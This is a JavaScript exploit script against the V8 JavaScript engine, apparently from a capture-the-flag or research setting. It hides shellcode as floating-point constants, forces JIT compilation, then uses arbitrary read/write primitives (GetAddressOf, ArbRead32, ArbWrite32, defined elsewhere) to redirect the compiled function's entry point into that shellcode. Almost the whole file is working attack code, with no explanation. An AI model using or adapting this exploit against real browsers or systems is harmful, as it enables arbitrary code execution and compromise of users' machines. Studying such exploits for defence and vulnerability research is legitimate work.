// function stop(){
//     %SystemBreak();
// }

// function p(arg){
//     %DebugPrint(arg);
// }

function spin(){
    while(1){};
}

function hex(str){
    return str.toString(16).padStart(16,0);
}

function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}


const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}

for(let i = 0; i< 0x10000; i++){
    shellcode();
}

var shellcode_addr = GetAddressOf(shellcode);
var code_addr = ArbRead32(shellcode_addr+0xc);
var ins_base_lo = ArbRead32(code_addr-1+0x14);
var ins_base_hi = ArbRead32(code_addr-1+0x14+4);
var rop_addr = BigInt(ins_base_hi) * 4294967296n + BigInt(ins_base_lo)+0x6bn;

logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base_lo",ins_base_lo);
logg("ins_base_hi",ins_base_hi);
logg("rop_addr",rop_addr);
logg("ins_base_lo+0x69+2",ins_base_lo+0x69+2);

ArbWrite32(code_addr-1+0x14,ins_base_lo+0x69+2);

shellcode();